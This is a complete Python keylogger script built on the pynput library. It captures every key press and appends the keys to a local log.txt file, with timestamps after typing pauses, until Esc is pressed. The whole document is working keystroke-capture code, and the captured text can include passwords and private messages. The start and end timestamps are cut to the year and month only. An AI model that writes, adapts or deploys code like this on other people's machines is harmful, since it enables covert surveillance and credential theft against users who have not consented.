from pynput.keyboard import Listener,Key
from datetime import datetime
import time
import os

count = 0
keys = []
last_key_time = None

# Get the directory where the script is located
script_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(script_dir, "log.txt")

with open(log_file, "a") as f:
    f.write("Keylogger Started at " + (str(datetime.now()))[:+7] + "\n")

def on_press(key):
    global keys, count, last_key_time
    current_time = time.time()
    
    if last_key_time is not None and (current_time - last_key_time) >= 4:
        with open(log_file, "a") as f:
            f.write("\n[" + str(datetime.now())[:19] + "] ")
    
    last_key_time = current_time
    keys.append(key)
    count += 1
    if count >= 5:
        count = 0
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:
        return False
    
def write_file(keys):
    with open(log_file, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("Key") == -1:
                f.write("[" + k + "]")

if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
with open(log_file, "a") as f:
    f.write("\nKeylogger Ended at " + (str(datetime.now()))[:+7] + "\n")
    f.write("-----------------------------------------------------------------------------") 